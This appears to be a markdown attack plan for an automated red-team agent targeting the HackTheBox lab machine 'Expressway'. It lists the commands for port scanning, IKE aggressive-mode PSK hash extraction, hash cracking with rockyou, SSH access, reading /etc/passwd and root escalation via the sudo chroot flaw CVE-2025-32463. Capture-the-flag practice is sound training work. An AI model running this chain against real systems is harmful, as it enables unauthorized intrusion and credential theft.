# Red Team Agent - Attack Plan & Tasks

**Target**: Expressway (HackTheBox)
**Status**: Awaiting Target IP from User
**Last Updated**: Pending first session

---

## Pre-Attack Checklist

- [ ] Receive target IP from user
- [ ] Verify VPN connection to HTB
- [ ] Create session log file
- [ ] Confirm attack authorization

---

## Attack Plan

### Phase 1: Reconnaissance

**Objective**: Map the attack surface

**Tasks**:
- [ ] Run comprehensive TCP port scan
  - Command: `nmap -sV -sC -p- {TARGET_IP}`
  - Output: `output/01_tcp_scan.txt`
  - Expected: SSH on port 22

- [ ] Run UDP port scan (CRITICAL)
  - Command: `nmap -sU -sV --top-ports 100 {TARGET_IP}`
  - Output: `output/02_udp_scan.txt`
  - Expected: ISAKMP/IKE on port 500/UDP

**Log to**: `output/phase1_reconnaissance.json`

---

### Phase 2: Service Enumeration

**Objective**: Enumerate IKE/IPsec VPN configuration

**Tasks**:
- [ ] Basic IKE handshake test
  - Command: `ike-scan {TARGET_IP}`
  - Output: `output/03_ike_basic.txt`

- [ ] Aggressive mode scan (reveals identity!)
  - Command: `ike-scan -A {TARGET_IP}`
  - Output: `output/04_ike_aggressive.txt`
  - Expected: Identity disclosure (username)

- [ ] Extract PSK hash material
  - Command: `ike-scan -A {TARGET_IP} --id={IDENTITY} -P output/05_ike.psk`
  - Expected: Hash suitable for offline cracking

**Vulnerability Finding**:
- VULN-001: IKE service exposed on UDP 500
- VULN-002: Aggressive mode enabled - identity and PSK hash leaked

**Log to**: `output/phase2_enumeration.json`

---

### Phase 3: Credential Attack

**Objective**: Recover plaintext PSK from hash

**Tasks**:
- [ ] Crack PSK using psk-crack
  - Command: `psk-crack -d /usr/share/wordlists/rockyou.txt output/05_ike.psk`
  - Output: `output/06_cracked_psk.txt`

- [ ] Alternative: hashcat if psk-crack fails
  - Command: `hashcat -m 5400 output/05_ike.psk /usr/share/wordlists/rockyou.txt`
  - Mode 5400 = IKE-PSK SHA1

- [ ] Document discovered credentials
  - Save to: `output/07_credentials.json`

**Log to**: `output/phase3_credential_attack.json`

---

### Phase 4: Initial Access

**Objective**: Gain foothold on target system

**Tasks**:
- [ ] SSH authentication with cracked credentials
  - Command: `ssh {USERNAME}@{TARGET_IP}`
  - Password: From Phase 3

- [ ] Capture user flag immediately
  - Command: `cat ~/user.txt`
  - Output: `output/08_user_flag.txt`

- [ ] Basic system enumeration
  - Commands: `id`, `whoami`, `uname -a`, `cat /etc/passwd`
  - Output: `output/09_system_info.txt`

**Log to**: `output/phase4_initial_access.json`

---

### Phase 5: Privilege Escalation

**Objective**: Escalate from user to root

**Tasks**:
- [ ] Enumerate sudo configuration
  - Command: `sudo -l`
  - Output: `output/10_sudo_check.txt`

- [ ] Locate sudo binary (non-standard path!)
  - Command: `which sudo`
  - Expected: `/usr/local/bin/sudo` (NOT `/usr/bin/sudo`)

- [ ] Check sudo version
  - Command: `/usr/local/bin/sudo --version`
  - Output: `output/11_sudo_version.txt`
  - Expected: Version <= 1.9.17 (VULNERABLE!)

- [ ] Verify CVE-2025-32463 applicability
  - Conditions: sudo <= 1.9.17, chroot option available

- [ ] Prepare CVE-2025-32463 exploit
  - Create chroot directory structure
  - Create malicious nsswitch.conf
  - Compile NSS module with root payload
  - Output: `output/12_exploit_setup.txt`

- [ ] Execute privilege escalation
  - Command: `/usr/local/bin/sudo -h {CHROOT_PATH} bash`
  - Expected: Root shell

**Vulnerability Finding**:
- VULN-003: CVE-2025-32463 - Sudo chwroot privilege escalation

**Log to**: `output/phase5_privesc.json`

---

### Phase 6: Post-Exploitation

**Objective**: Capture root flag and document attack

**Tasks**:
- [ ] Capture root flag
  - Command: `cat /root/root.txt`
  - Output: `output/13_root_flag.txt`

- [ ] Compile complete attack log
  - Output: `output/14_complete_attack_log.json`

- [ ] Prepare handoff for Report Agent
  - Location: `sessions/attack_complete.json`

**Log to**: `output/phase6_post_exploit.json`

---

## Output Structure for Report Agent

All outputs saved to `output/` directory in structured format:

```
output/
├── 01_tcp_scan.txt           # Phase 1
├── 02_udp_scan.txt           # Phase 1
├── 03_ike_basic.txt          # Phase 2
├── 04_ike_aggressive.txt     # Phase 2
├── 05_ike.psk                # Phase 2 (hash file)
├── 06_cracked_psk.txt        # Phase 3
├── 07_credentials.json       # Phase 3
├── 08_user_flag.txt          # Phase 4
├── 09_system_info.txt        # Phase 4
├── 10_sudo_check.txt         # Phase 5
├── 11_sudo_version.txt       # Phase 5
├── 12_exploit_setup.txt      # Phase 5
├── 13_root_flag.txt          # Phase 6
├── 14_complete_attack_log.json  # Final summary
│
├── phase1_reconnaissance.json   # Phase logs
├── phase2_enumeration.json
├── phase3_credential_attack.json
├── phase4_initial_access.json
├── phase5_privesc.json
└── phase6_post_exploit.json
```

---

## JSON Log Format

Each phase log uses this structure:

```json
{
  "phase": "reconnaissance",
  "phase_number": 1,
  "timestamp_start": "ISO-8601",
  "timestamp_end": "ISO-8601",
  "target_ip": "{IP}",
  "commands": [
    {
      "command": "nmap -sV -sC -p- {IP}",
      "output_file": "01_tcp_scan.txt",
      "success": true,
      "key_findings": ["SSH on 22/TCP"]
    }
  ],
  "findings": [
    {
      "id": "FINDING-001",
      "type": "service",
      "description": "SSH service on port 22",
      "evidence": "output/01_tcp_scan.txt"
    }
  ],
  "vulnerabilities": [],
  "credentials": [],
  "flags": [],
  "next_phase": "enumeration"
}
```

---

## Final Handoff to Report Agent

Location: `sessions/attack_complete.json`

```json
{
  "engagement": {
    "target_ip": "{IP}",
    "hostname": "expressway.htb",
    "platform": "HackTheBox Season 9",
    "start_time": "ISO-8601",
    "end_time": "ISO-8601"
  },
  "summary": {
    "total_phases": 6,
    "vulnerabilities_found": 3,
    "credentials_recovered": 1,
    "flags_captured": 2
  },
  "vulnerabilities": [
    {
      "id": "VULN-001",
      "title": "IKE/IPsec VPN Service Exposed",
      "severity": "MEDIUM",
      "cvss": 5.3,
      "description": "...",
      "evidence": "output/02_udp_scan.txt",
      "remediation": "..."
    },
    {
      "id": "VULN-002",
      "title": "IKE Aggressive Mode Information Disclosure",
      "severity": "HIGH",
      "cvss": 7.5,
      "cve": null,
      "description": "...",
      "evidence": "output/04_ike_aggressive.txt",
      "remediation": "..."
    },
    {
      "id": "VULN-003",
      "title": "Sudo Privilege Escalation",
      "severity": "CRITICAL",
      "cvss": 8.1,
      "cve": "CVE-2025-32463",
      "description": "...",
      "evidence": "output/11_sudo_version.txt",
      "remediation": "..."
    }
  ],
  "credentials": {
    "username": "{USER}",
    "password": "{PASS}",
    "access_type": "SSH"
  },
  "flags": {
    "user": "{USER_FLAG}",
    "root": "{ROOT_FLAG}"
  },
  "phases": [
    "output/phase1_reconnaissance.json",
    "output/phase2_enumeration.json",
    "output/phase3_credential_attack.json",
    "output/phase4_initial_access.json",
    "output/phase5_privesc.json",
    "output/phase6_post_exploit.json"
  ],
  "attack_narrative": "..."
}
```

---

## Success Criteria

- [ ] User flag captured
- [ ] Root flag captured
- [ ] All 6 phases documented
- [ ] 3 vulnerabilities documented
- [ ] All output files created
- [ ] attack_complete.json ready for Report Agent

---

**Status**: READY - Awaiting Target IP
